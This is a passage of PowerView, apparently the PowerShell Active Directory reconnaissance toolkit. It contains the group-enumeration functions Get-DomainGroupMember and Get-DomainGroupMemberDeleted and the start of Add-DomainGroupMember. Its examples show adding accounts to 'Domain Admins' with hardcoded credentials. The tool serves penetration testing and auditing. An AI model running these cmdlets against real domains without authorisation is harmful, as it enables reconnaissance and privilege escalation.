Admins\"\n\nGroupDomain             : testlab.local\nGroupName               : Desktop Admins\nGroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local\nMemberDomain            : testlab.local\nMemberName              : Testing Group\nMemberDistinguishedName : CN=Testing Group,CN=Users,DC=testlab,DC=local\nMemberObjectClass       : group\nMemberSID               : S-1-5-21-890171859-3433809279-3366196753-1129\n\nGroupDomain             : testlab.local\nGroupName               : Desktop Admins\nGroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local\nMemberDomain            : testlab.local\nMemberName              : arobbins.a\nMemberDistinguishedName : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local\nMemberObjectClass       : user\nMemberSID               : S-1-5-21-890171859-3433809279-3366196753-1112\n\n.EXAMPLE\n\n'Desktop Admins' | Get-DomainGroupMember -Recurse\n\nGroupDomain             : testlab.local\nGroupName               : Desktop Admins\nGroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local\nMemberDomain            : testlab.local\nMemberName              : Testing Group\nMemberDistinguishedName : CN=Testing Group,CN=Users,DC=testlab,DC=local\nMemberObjectClass       : group\nMemberSID               : S-1-5-21-890171859-3433809279-3366196753-1129\n\nGroupDomain             : testlab.local\nGroupName               : Testing Group\nGroupDistinguishedName  : CN=Testing Group,CN=Users,DC=testlab,DC=local\nMemberDomain            : testlab.local\nMemberName              : harmj0y\nMemberDistinguishedName : CN=harmj0y,CN=Users,DC=testlab,DC=local\nMemberObjectClass       : user\nMemberSID               : S-1-5-21-890171859-3433809279-3366196753-1108\n\nGroupDomain             : testlab.local\nGroupName               : Desktop Admins\nGroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local\nMemberDomain            : testlab.local\nMemberName              : arobbins.a\nMemberDistinguishedName : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local\nMemberObjectClass       : user\nMemberSID               : S-1-5-21-890171859-3433809279-3366196753-1112\n\n.EXAMPLE\n\nGet-DomainGroupMember -Domain testlab.local -Identity 'Desktop Admins' -RecurseUingMatchingRule\n\nGroupDomain             : testlab.local\nGroupName               : Desktop Admins\nGroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local\nMemberDomain            : testlab.local\nMemberName              : harmj0y\nMemberDistinguishedName : CN=harmj0y,CN=Users,DC=testlab,DC=local\nMemberObjectClass       : user\nMemberSID               : S-1-5-21-890171859-3433809279-3366196753-1108\n\nGroupDomain             : testlab.local\nGroupName               : Desktop Admins\nGroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local\nMemberDomain            : testlab.local\nMemberName              : arobbins.a\nMemberDistinguishedName : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local\nMemberObjectClass       : user\nMemberSID               : S-1-5-21-890171859-3433809279-3366196753-1112\n\n.EXAMPLE\n\nGet-DomainGroup *admin* -Properties samaccountname | Get-DomainGroupMember\n\n.EXAMPLE\n\n'CN=Enterprise Admins,CN=Users,DC=testlab,DC=local', 'Domain Admins' | Get-DomainGroupMember\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-DomainGroupMember -Credential $Cred -Identity 'Domain Admins'\n\n.EXAMPLE\n\nGet-Domain | Select-Object -Expand name\ntestlab.local\n\n'dev\\domain admins' | Get-DomainGroupMember -Verbose\nVERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\nVERBOSE: [Get-DomainGroupMember] Extracted domain 'dev.testlab.local' from 'dev\\domain admins'\nVERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local\nVERBOSE: [Get-DomainGroupMember] Get-DomainGroupMember filter string: (&(objectCategory=group)(|(samAccountName=domain admins)))\nVERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local\nVERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=user1,CN=Users,DC=dev,DC=testlab,DC=local)))\n\nGroupDomain             : dev.testlab.local\nGroupName               : Domain Admins\nGroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local\nMemberDomain            : dev.testlab.local\nMemberName              : user1\nMemberDistinguishedName : CN=user1,CN=Users,DC=dev,DC=testlab,DC=local\nMemberObjectClass       : user\nMemberSID               : S-1-5-21-339048670-1233568108-4141518690-201108\n\nVERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local\nVERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=Administrator,CN=Users,DC=dev,DC=testlab,DC=local)))\nGroupDomain             : dev.testlab.local\nGroupName               : Domain Admins\nGroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local\nMemberDomain            : dev.testlab.local\nMemberName              : Administrator\nMemberDistinguishedName : CN=Administrator,CN=Users,DC=dev,DC=testlab,DC=local\nMemberObjectClass       : user\nMemberSID               : S-1-5-21-339048670-1233568108-4141518690-500\n\n.OUTPUTS\n\nPowerView.GroupMember\n\nCustom PSObject with translated group member property fields.\n\n.LINK\n\nhttp://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-an-active-directory-group-recursively/\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]\n    [OutputType('PowerView.GroupMember')]\n    [CmdletBinding(DefaultParameterSetName = 'None')]\n    Param(\n        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]\n        [String[]]\n        $Identity,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [Parameter(ParameterSetName = 'ManualRecurse')]\n        [Switch]\n        $Recurse,\n\n        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]\n        [Switch]\n        $RecurseUsingMatchingRule,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]\n        [String]\n        $SecurityMasks,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        $SearcherArguments = @{\n            'Properties' = 'member,samaccountname,distinguishedname'\n        }\n        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }\n        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n\n        $ADNameArguments = @{}\n        if ($PSBoundParameters['Domain']) { $ADNameArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }\n        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }\n    }\n\n    PROCESS {\n        $GroupSearcher = Get-DomainSearcher @SearcherArguments\n        if ($GroupSearcher) {\n            if ($PSBoundParameters['RecurseUsingMatchingRule']) {\n                $SearcherArguments['Identity'] = $Identity\n                $SearcherArguments['Raw'] = $True\n                $Group = Get-DomainGroup @SearcherArguments\n\n                if (-not $Group) {\n                    Write-Warning \"[Get-DomainGroupMember] Error searching for group with identity: $Identity\"\n                }\n                else {\n                    $GroupFoundName = $Group.properties.item('samaccountname')[0]\n                    $GroupFoundDN = $Group.properties.item('distinguishedname')[0]\n\n                    if ($PSBoundParameters['Domain']) {\n                        $GroupFoundDomain = $Domain\n                    }\n                    else {\n                        # if a domain isn't passed, try to extract it from the found group distinguished name\n                        if ($GroupFoundDN) {\n                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'\n                        }\n                    }\n                    Write-Verbose \"[Get-DomainGroupMember] Using LDAP matching rule to recurse on '$GroupFoundDN', only user accounts will be returned.\"\n                    $GroupSearcher.filter = \"(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupFoundDN))\"\n                    $GroupSearcher.PropertiesToLoad.AddRange(('distinguishedName'))\n                    $Members = $GroupSearcher.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}\n                }\n                $Null = $SearcherArguments.Remove('Raw')\n            }\n            else {\n                $IdentityFilter = ''\n                $Filter = ''\n                $Identity | Where-Object {$_} | ForEach-Object {\n                    $IdentityInstance = $_.Replace('(', '\\28').Replace(')', '\\29')\n                    if ($IdentityInstance -match '^S-1-') {\n                        $IdentityFilter += \"(objectsid=$IdentityInstance)\"\n                    }\n                    elseif ($IdentityInstance -match '^CN=') {\n                        $IdentityFilter += \"(distinguishedname=$IdentityInstance)\"\n                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {\n                            # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname\n                            #   and rebuild the domain searcher\n                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'\n                            Write-Verbose \"[Get-DomainGroupMember] Extracted domain '$IdentityDomain' from '$IdentityInstance'\"\n                            $SearcherArguments['Domain'] = $IdentityDomain\n                            $GroupSearcher = Get-DomainSearcher @SearcherArguments\n                            if (-not $GroupSearcher) {\n                                Write-Warning \"[Get-DomainGroupMember] Unable to retrieve domain searcher for '$IdentityDomain'\"\n                            }\n                        }\n                    }\n                    elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {\n                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\\' + $_.ToString('X2') }) -join ''\n                        $IdentityFilter += \"(objectguid=$GuidByteString)\"\n                    }\n                    elseif ($IdentityInstance.Contains('\\')) {\n                        $ConvertedIdentityInstance = $IdentityInstance.Replace('\\28', '(').Replace('\\29', ')') | Convert-ADName -OutputType Canonical\n                        if ($ConvertedIdentityInstance) {\n                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))\n                            $GroupName = $IdentityInstance.Split('\\')[1]\n                            $IdentityFilter += \"(samAccountName=$GroupName)\"\n                            $SearcherArguments['Domain'] = $GroupDomain\n                            Write-Verbose \"[Get-DomainGroupMember] Extracted domain '$GroupDomain' from '$IdentityInstance'\"\n                            $GroupSearcher = Get-DomainSearcher @SearcherArguments\n                        }\n                    }\n                    else {\n                        $IdentityFilter += \"(samAccountName=$IdentityInstance)\"\n                    }\n                }\n\n                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {\n                    $Filter += \"(|$IdentityFilter)\"\n                }\n\n                if ($PSBoundParameters['LDAPFilter']) {\n                    Write-Verbose \"[Get-DomainGroupMember] Using additional LDAP filter: $LDAPFilter\"\n                    $Filter += \"$LDAPFilter\"\n                }\n\n                $GroupSearcher.filter = \"(&(objectCategory=group)$Filter)\"\n                Write-Verbose \"[Get-DomainGroupMember] Get-DomainGroupMember filter string: $($GroupSearcher.filter)\"\n                try {\n                    $Result = $GroupSearcher.FindOne()\n                }\n                catch {\n                    Write-Warning \"[Get-DomainGroupMember] Error searching for group with identity '$Identity': $_\"\n                    $Members = @()\n                }\n\n                $GroupFoundName = ''\n                $GroupFoundDN = ''\n\n                if ($Result) {\n                    $Members = $Result.properties.item('member')\n\n                    if ($Members.count -eq 0) {\n                        # ranged searching, thanks @meatballs__ !\n                        $Finished = $False\n                        $Bottom = 0\n                        $Top = 0\n\n                        while (-not $Finished) {\n                            $Top = $Bottom + 1499\n                            $MemberRange=\"member;range=$Bottom-$Top\"\n                            $Bottom += 1500\n                            $Null = $GroupSearcher.PropertiesToLoad.Clear()\n                            $Null = $GroupSearcher.PropertiesToLoad.Add(\"$MemberRange\")\n                            $Null = $GroupSearcher.PropertiesToLoad.Add('samaccountname')\n                            $Null = $GroupSearcher.PropertiesToLoad.Add('distinguishedname')\n\n                            try {\n                                $Result = $GroupSearcher.FindOne()\n                                $RangedProperty = $Result.Properties.PropertyNames -like \"member;range=*\"\n                                $Members += $Result.Properties.item($RangedProperty)\n                                $GroupFoundName = $Result.properties.item('samaccountname')[0]\n                                $GroupFoundDN = $Result.properties.item('distinguishedname')[0]\n\n                                if ($Members.count -eq 0) {\n                                    $Finished = $True\n                                }\n                            }\n                            catch [System.Management.Automation.MethodInvocationException] {\n                                $Finished = $True\n                            }\n                        }\n                    }\n                    else {\n                        $GroupFoundName = $Result.properties.item('samaccountname')[0]\n                        $GroupFoundDN = $Result.properties.item('distinguishedname')[0]\n                        $Members += $Result.Properties.item($RangedProperty)\n                    }\n\n                    if ($PSBoundParameters['Domain']) {\n                        $GroupFoundDomain = $Domain\n                    }\n                    else {\n                        # if a domain isn't passed, try to extract it from the found group distinguished name\n                        if ($GroupFoundDN) {\n                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'\n                        }\n                    }\n                }\n            }\n\n            ForEach ($Member in $Members) {\n                if ($Recurse -and $UseMatchingRule) {\n                    $Properties = $_.Properties\n                }\n                else {\n                    $ObjectSearcherArguments = $SearcherArguments.Clone()\n                    $ObjectSearcherArguments['Identity'] = $Member\n                    $ObjectSearcherArguments['Raw'] = $True\n                    $ObjectSearcherArguments['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'\n                    $Object = Get-DomainObject @ObjectSearcherArguments\n                    $Properties = $Object.Properties\n                }\n\n                if ($Properties) {\n                    $GroupMember = New-Object PSObject\n                    $GroupMember | Add-Member Noteproperty 'GroupDomain' $GroupFoundDomain\n                    $GroupMember | Add-Member Noteproperty 'GroupName' $GroupFoundName\n                    $GroupMember | Add-Member Noteproperty 'GroupDistinguishedName' $GroupFoundDN\n\n                    if ($Properties.objectsid) {\n                        $MemberSID = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectsid[0], 0).Value)\n                    }\n                    else {\n                        $MemberSID = $Null\n                    }\n\n                    try {\n                        $MemberDN = $Properties.distinguishedname[0]\n                        if ($MemberDN -match 'ForeignSecurityPrincipals|S-1-5-21') {\n                            try {\n                                if (-not $MemberSID) {\n                                    $MemberSID = $Properties.cn[0]\n                                }\n                                $MemberSimpleName = Convert-ADName -Identity $MemberSID -OutputType 'DomainSimple' @ADNameArguments\n\n                                if ($MemberSimpleName) {\n                                    $MemberDomain = $MemberSimpleName.Split('@')[1]\n                                }\n                                else {\n                                    Write-Warning \"[Get-DomainGroupMember] Error converting $MemberDN\"\n                                    $MemberDomain = $Null\n                                }\n                            }\n                            catch {\n                                Write-Warning \"[Get-DomainGroupMember] Error converting $MemberDN\"\n                                $MemberDomain = $Null\n                            }\n                        }\n                        else {\n                            # extract the FQDN from the Distinguished Name\n                            $MemberDomain = $MemberDN.SubString($MemberDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'\n                        }\n                    }\n                    catch {\n                        $MemberDN = $Null\n                        $MemberDomain = $Null\n                    }\n\n                    if ($Properties.samaccountname) {\n                        # forest users have the samAccountName set\n                        $MemberName = $Properties.samaccountname[0]\n                    }\n                    else {\n                        # external trust users have a SID, so convert it\n                        try {\n                            $MemberName = ConvertFrom-SID -ObjectSID $Properties.cn[0] @ADNameArguments\n                        }\n                        catch {\n                            # if there's a problem contacting the domain to resolve the SID\n                            $MemberName = $Properties.cn[0]\n                        }\n                    }\n\n                    if ($Properties.objectclass -match 'computer') {\n                        $MemberObjectClass = 'computer'\n                    }\n                    elseif ($Properties.objectclass -match 'group') {\n                        $MemberObjectClass = 'group'\n                    }\n                    elseif ($Properties.objectclass -match 'user') {\n                        $MemberObjectClass = 'user'\n                    }\n                    else {\n                        $MemberObjectClass = $Null\n                    }\n                    $GroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain\n                    $GroupMember | Add-Member Noteproperty 'MemberName' $MemberName\n                    $GroupMember | Add-Member Noteproperty 'MemberDistinguishedName' $MemberDN\n                    $GroupMember | Add-Member Noteproperty 'MemberObjectClass' $MemberObjectClass\n                    $GroupMember | Add-Member Noteproperty 'MemberSID' $MemberSID\n                    $GroupMember.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')\n                    $GroupMember\n\n                    # if we're doing manual recursion\n                    if ($PSBoundParameters['Recurse'] -and $MemberDN -and ($MemberObjectClass -match 'group')) {\n                        Write-Verbose \"[Get-DomainGroupMember] Manually recursing on group: $MemberDN\"\n                        $SearcherArguments['Identity'] = $MemberDN\n                        $Null = $SearcherArguments.Remove('Properties')\n                        Get-DomainGroupMember @SearcherArguments\n                    }\n                }\n            }\n            $GroupSearcher.dispose()\n        }\n    }\n}\n\n\nfunction Get-DomainGroupMemberDeleted {\n<#\n.SYNOPSIS\n\nReturns information on group members that were removed from the specified\ngroup identity. Accomplished by searching the linked attribute replication\nmetadata for the group using Get-DomainObjectLinkedAttributeHistory.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainObjectLinkedAttributeHistory\n\n.DESCRIPTION\n\nWraps Get-DomainObjectLinkedAttributeHistory to return the linked attribute\nreplication metadata for the specified group. These are cases where the\n'Version' attribute of group member in the replication metadata is even.\n\n.PARAMETER Identity\n\nA SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).\nWildcards accepted.\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-DomainGroupMemberDeleted | Group-Object GroupDN\n\nCount Name                      Group\n----- ----                      -----\n    2 CN=Domain Admins,CN=Us... {@{GroupDN=CN=Domain Admins,CN=Users,DC=test...\n    3 CN=DomainLocalGroup,CN... {@{GroupDN=CN=DomainLocalGroup,CN=Users,DC=t...\n\n.EXAMPLE\n\nGet-DomainGroupMemberDeleted \"Domain Admins\" -Domain testlab.local\n\n\nGroupDN               : CN=Domain Admins,CN=Users,DC=testlab,DC=local\nMemberDN              : CN=testuser,CN=Users,DC=testlab,DC=local\nTimeFirstAdded        : 2017-06-13T23:07:43Z\nTimeDeleted           : 2017-06-13T23:26:17Z\nLastOriginatingChange : 2017-06-13T23:26:17Z\nTimesAdded            : 2\nLastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First\n                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca\n                        l\n\nGroupDN               : CN=Domain Admins,CN=Users,DC=testlab,DC=local\nMemberDN              : CN=dfm,CN=Users,DC=testlab,DC=local\nTimeFirstAdded        : 2017-06-13T22:20:02Z\nTimeDeleted           : 2017-06-13T23:26:17Z\nLastOriginatingChange : 2017-06-13T23:26:17Z\nTimesAdded            : 5\nLastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First\n                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca\n                        l\n\n.OUTPUTS\n\nPowerView.DomainGroupMemberDeleted\n\nCustom PSObject with translated replication metadata fields.\n\n.LINK\n\nhttps://blogs.technet.microsoft.com/pie/2014/08/25/metadata-2-the-ephemeral-admin-or-how-to-track-the-group-membership/\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]\n    [OutputType('PowerView.DomainGroupMemberDeleted')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]\n        [String[]]\n        $Identity,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty,\n\n        [Switch]\n        $Raw\n    )\n\n    BEGIN {\n        $SearcherArguments = @{\n            'Properties'    =   'msds-replvaluemetadata','distinguishedname'\n            'Raw'           =   $True\n            'LDAPFilter'    =   '(objectCategory=group)'\n        }\n        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }\n        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n    }\n\n    PROCESS {\n        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }\n\n        Get-DomainObject @SearcherArguments | ForEach-Object {\n            $ObjectDN = $_.Properties['distinguishedname'][0]\n            ForEach($XMLNode in $_.Properties['msds-replvaluemetadata']) {\n                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue\n                if ($TempObject) {\n                    if (($TempObject.pszAttributeName -Match 'member') -and (($TempObject.dwVersion % 2) -eq 0 )) {\n                        $Output = New-Object PSObject\n                        $Output | Add-Member NoteProperty 'GroupDN' $ObjectDN\n                        $Output | Add-Member NoteProperty 'MemberDN' $TempObject.pszObjectDn\n                        $Output | Add-Member NoteProperty 'TimeFirstAdded' $TempObject.ftimeCreated\n                        $Output | Add-Member NoteProperty 'TimeDeleted' $TempObject.ftimeDeleted\n                        $Output | Add-Member NoteProperty 'LastOriginatingChange' $TempObject.ftimeLastOriginatingChange\n                        $Output | Add-Member NoteProperty 'TimesAdded' ($TempObject.dwVersion / 2)\n                        $Output | Add-Member NoteProperty 'LastOriginatingDsaDN' $TempObject.pszLastOriginatingDsaDN\n                        $Output.PSObject.TypeNames.Insert(0, 'PowerView.DomainGroupMemberDeleted')\n                        $Output\n                    }\n                }\n                else {\n                    Write-Verbose \"[Get-DomainGroupMemberDeleted] Error retrieving 'msds-replvaluemetadata' for '$ObjectDN'\"\n                }\n            }\n        }\n    }\n}\n\n\nfunction Add-DomainGroupMember {\n<#\n.SYNOPSIS\n\nAdds a domain user (or group) to an existing domain group, assuming\nappropriate permissions to do so.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-PrincipalContext  \n\n.DESCRIPTION\n\nFirst binds to the specified domain context using Get-PrincipalContext.\nThe bound domain context is then used to search for the specified -GroupIdentity,\nwhich returns a DirectoryServices.AccountManagement.GroupPrincipal object. For\neach entry in -Members, each member identity is similarly searched for and added\nto the group.\n\n.PARAMETER Identity\n\nA group SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)\nspecifying the group to add members to.\n\n.PARAMETER Members\n\nOne or more member identities, i.e. SamAccountName (e.g. Group1), DistinguishedName\n(e.g. CN=group1,CN=Users,DC=testlab,DC=local), SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114),\nor GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202).\n\n.PARAMETER Domain\n\nSpecifies the domain to use to search for user/group principals, defaults to the current domain.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nAdd-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y'\n\nAdds harmj0y to 'Domain Admins' in the current domain.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nAdd-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred\n\nAdds harmj0y to 'Domain Admins' in the current domain using the alternate credentials.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\n$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\nNew-DomainUser -SamAccountName andy -AccountPassword $UserPassword -Credential $Cred | Add-DomainGroupMember 'Domain Admins' -Credential $Cred\n\nCreates the 'andy' user with the specified description and password, using the specified\nalternate credentials, and adds the user to 'domain admins' using Add-DomainGroupMember\nand the alternate credentials.\n\n.LINK\n\nhttp://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, Mandatory = $True)]\n        [Alias('GroupName', 'GroupIdentity')]\n        [String]\n        $Identity,\n\n        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]\n        [String[]]\n        $Members,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        $ContextArguments = @{\n            'Identity' = $Identity\n        }\n        if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }\n\n        $GroupContext = Get-PrincipalContext @ContextArguments\n\n        if ($GroupContext) {\n            try {\n                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)\n            }\n            catch {\n                Write-Warning \"[Add-DomainGroupMember] Error finding the group identity '$Identity' : $_\"\n            }\n        }\n    }\n\n    PROCESS {\n        if ($Group) {\n            ForEach ($Member in $Members) {\n                if ($Member -match '.+\\\\.+') {\n                    $ContextArguments['Identity'] = $Member\n                    $UserContext = Get-PrincipalContext @ContextArguments\n                    if ($UserContext) {\n                        $UserIdentity = $UserContext.Identity\n                    }\n                }\n                else {\n                    $UserContext = $GroupContext\n                    $UserIdentity = $Member\n                }\n                Write-Verbose 